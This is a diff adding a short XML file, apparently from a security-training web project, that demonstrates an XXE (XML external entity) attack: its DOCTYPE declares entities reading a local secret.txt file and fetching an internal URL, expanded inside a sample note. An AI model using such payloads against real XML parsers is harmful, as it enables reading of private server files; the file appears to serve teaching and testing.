@@ -1,0 +1,14 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE note [
+  <!ENTITY examplea SYSTEM "file://C:\Dev\My\SecurityTrainingHttpHeaders\WebSiteAngel\wwwroot\xxe\secret.txt">
+  <!ENTITY exampleb SYSTEM "http://angel.local/xxe/secret.txt">  
+]>
+
+<note>
+  <to>Tove</to>
+  <from>Jani</from>
+  <heading>Reminder</heading>
+  <body>Don't forget me this weekend!</body>
+  <footer>&examplea;  &exampleb;</footer>
+</note>
